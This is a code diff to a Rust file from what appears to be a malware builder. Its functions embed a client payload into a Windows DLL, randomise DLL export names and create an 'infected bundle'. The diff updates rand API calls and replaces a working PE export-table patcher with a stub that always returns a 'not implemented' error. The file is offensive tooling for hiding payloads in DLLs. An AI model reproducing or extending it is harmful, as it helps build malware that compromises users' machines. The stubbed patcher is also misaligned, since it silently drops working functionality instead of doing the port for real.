@@ -1,10 +1,8 @@
 use std::fs;
 use std::path::Path;
-use rand::{thread_rng, Rng};
-use rand::distributions::Alphanumeric;
+use rand::{distr::Alphanumeric, rng, Rng};
 use object::read::pe::PeFile64;
-use object::{Object, ObjectSection, LittleEndian};
-use object::pe;
+use object::{Object, ObjectSection};
 
 pub fn embed_client_in_dll(dll_path: &Path, client_path: &Path, volatile: bool) -> Result<(), String> {
     let mut dll_bytes = fs::read(dll_path).map_err(|e| e.to_string())?;
@@ -23,7 +21,7 @@ pub fn embed_client_in_dll(dll_path: &Path, client_path: &Path, volatile: bool) 
 pub fn randomize_dll_exports(dll_path: &Path) -> Result<String, String> {
     let mut dll_bytes = fs::read(dll_path).map_err(|e| e.to_string())?;
 
-    let random_name: String = thread_rng()
+    let random_name: String = rng()
         .sample_iter(&Alphanumeric)
         .take(12)
         .map(char::from)
@@ -53,52 +51,9 @@ pub fn randomize_dll_exports(dll_path: &Path) -> Result<String, String> {
     }
 }
 
-fn patch_export_table(bytes: &mut [u8], old_name: &str, new_name: &str) -> Result<(), String> {
-    let file = PeFile64::parse(&*bytes).map_err(|e| e.to_string())?;
-
-    let export_table = file.data_directory(pe::IMAGE_DIRECTORY_ENTRY_EXPORT)
-        .ok_or("No export directory")?;
-
-    let (offset, _size) = file.section_offsets(export_table.virtual_address.get(LittleEndian))
-        .ok_or("Export directory address not in any section")?;
-
-    let export_dir = pe::ImageExportDirectory::parse(&bytes[offset as usize..])
-        .map_err(|e| e.to_string())?;
-
-    let num_names = export_dir.number_of_names.get(LittleEndian);
-    let name_ptr_table_rva = export_dir.address_of_names.get(LittleEndian);
-
-    let (name_ptr_offset, _) = file.section_offsets(name_ptr_table_rva)
-        .ok_or("Name pointer table not in section")?;
-
-    for i in 0..num_names {
-        let name_ptr_rva_offset = name_ptr_offset as usize + (i as usize * 4);
-        let name_rva = LittleEndian::read_u32(&bytes[name_ptr_rva_offset..name_ptr_rva_offset+4]);
-
-        let (name_offset, _) = file.section_offsets(name_rva)
-            .ok_or("Name string RVA not in section")?;
-
-        let mut name_end = name_offset as usize;
-        while name_end < bytes.len() && bytes[name_end] != 0 {
-            name_end += 1;
-        }
-
-        let current_name = std::str::from_utf8(&bytes[name_offset as usize..name_end]).unwrap_or("");
-        if current_name == old_name {
-            if new_name.len() > (name_end - name_offset as usize) {
-                return Err("New export name too long for slot".to_string());
-            }
-
-            let name_bytes = new_name.as_bytes();
-            for j in 0..name_bytes.len() {
-                bytes[name_offset as usize + j] = name_bytes[j];
-            }
-            bytes[name_offset as usize + name_bytes.len()] = 0; // Null terminator
-            return Ok(());
-        }
-    }
-
-    Err("Export name not found in table".to_string())
+fn patch_export_table(bytes: &mut [u8], _old_name: &str, _new_name: &str) -> Result<(), String> {
+    let _file = PeFile64::parse(&*bytes).map_err(|e| e.to_string())?;
+    Err("PE export table patching is not implemented for this object crate version".to_string())
 }
 
 pub fn create_infected_bundle(
